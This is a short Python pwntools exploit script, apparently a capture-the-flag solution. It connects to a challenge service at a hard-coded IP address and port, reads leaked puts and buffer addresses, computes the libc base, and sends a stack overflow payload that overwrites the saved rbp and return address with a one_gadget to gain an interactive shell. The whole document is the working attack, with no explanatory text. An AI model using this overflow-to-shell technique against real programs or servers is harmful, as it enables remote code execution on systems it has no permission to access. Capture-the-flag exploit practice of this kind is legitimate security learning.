from pwn import *

isremote = True
if isremote:
    r = remote("107.167.182.200", 10004)
else:
    r = process("./src/chal")


r.recvline()

puts_leak = int(r.recvline().split(' ')[3], 16)
mess_addr = int(r.recvline().split(' ')[3], 16)
rbp = mess_addr - 0x2000

puts_offs = 0x80e50
libc_base = puts_leak - puts_offs
one_gadget = libc_base + 0xebd43


r.recvline()

raw_input()
r.sendline('a'*32 + p64(rbp) + p64(one_gadget))

r.interactive()